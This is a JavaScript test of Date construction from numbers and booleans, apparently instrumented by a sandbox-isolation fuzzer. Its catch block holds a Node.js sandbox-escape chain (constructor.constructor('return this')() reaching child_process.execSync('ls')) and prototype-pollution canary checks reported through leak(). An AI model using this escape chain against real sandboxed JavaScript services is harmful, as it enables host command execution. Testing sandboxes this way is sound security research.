try {
    var d1 = new Date(6.54321);
    if (d1.valueOf() !== 6) {
        $ERROR('#1: var d1 = new Date(6.54321); d1.valueOf() === 6;');
    }
    var d2 = new Date(-6.54321);
    if (d2.valueOf() !== -6) {
        $ERROR('#2: var d2 = new Date(-6.54321); d2.valueOf() === -6;');
    }
    var d3 = new Date(654.321);
    if (d3.valueOf() !== 654) {
        $ERROR('#3: var d3 = new Date(6.54321e2); d3.valueOf() === 654;');
    }
    var d4 = new Date(-654.321);
    if (d4.valueOf() !== -654) {
        $ERROR('#4: var d4 = new Date(-6.54321e2); d4.valueOf() === -654;');
    }
    var d5 = new Date(6.54321);
    if (d5.valueOf() !== 6) {
        $ERROR('#5: var d5 = new Date(0.654321e1); d5.valueOf() === 6;');
    }
    var d6 = new Date(-6.54321);
    if (d6.valueOf() !== -6) {
        $ERROR('#6: var d6 = new Date(-0.654321e1); d6.valueOf() === -6;');
    }
    var d7 = new Date(true);
    if (d7.valueOf() !== 1) {
        $ERROR('#7: var d7 = new Date(true); d7.valueOf() === 1;');
    }
    var d8 = new Date(false);
    if (d8.valueOf() !== 0) {
        $ERROR('#8: var d8 = new Date(false); d8.valueOf() === 0;');
    }
    var d9 = new Date(1230000000000000);
    if (d9.valueOf() !== 1230000000000000) {
        $ERROR('#9: var d9 = new Date(1.23e15); d9.valueOf() === 1.23e15;');
    }
    var d10 = new Date(-1230000000000000);
    if (d10.valueOf() !== -1230000000000000) {
        $ERROR('#10: var d10 = new Date(-1.23e15); d10.valueOf() === -1.23e15;');
    }
    var d11 = new Date(1.23e-15);
    if (d11.valueOf() !== 0) {
        $ERROR('#11: var d11 = new Date(1.23e-15); d11.valueOf() === 0;');
    }
    var d12 = new Date(-1.23e-15);
    if (d12.valueOf() !== -0) {
        $ERROR('#12: var d12 = new Date(-1.23e-15); d12.valueOf() === -0;');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}